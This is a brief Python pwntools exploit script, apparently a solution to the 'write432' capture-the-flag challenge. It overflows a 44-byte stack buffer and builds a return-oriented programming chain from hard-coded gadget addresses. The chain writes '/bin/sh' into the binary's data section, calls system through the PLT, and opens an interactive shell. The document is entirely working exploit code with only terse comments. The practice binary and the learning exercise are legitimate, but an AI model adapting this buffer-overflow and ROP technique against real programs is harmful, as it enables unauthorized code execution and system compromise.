from pwn import *
p = process('./write432')
#have to write /bin/sh on the stack and execute it
rg1 = p32(0x080486da) #pop edi ; pop ebp ; ret
rg2 = p32(0x08048670) #mov dword ptr [edi], ebp ; ret
data = p32(0x0804a028) #data section is rw
data2 = p32(0x0804a02c) #data +4
data3 = p32(0x0804a030) #data +8
data4 = p32(0x0804a034)
offset = 44
system = p32(0x08048430) #@plt

payload = "A"*offset
payload += rg1 + data + '/bin' + rg2
payload += rg1 + data2 + '/sh\x00' + rg2
#payload += rg1 + data3 + 'flag' + rg2
#payload += rg1 + data4 + '.txt' + rg2
payload += system + "BBBB" + data

p.recvuntil('>')
p.sendline(payload)
p.interactive()
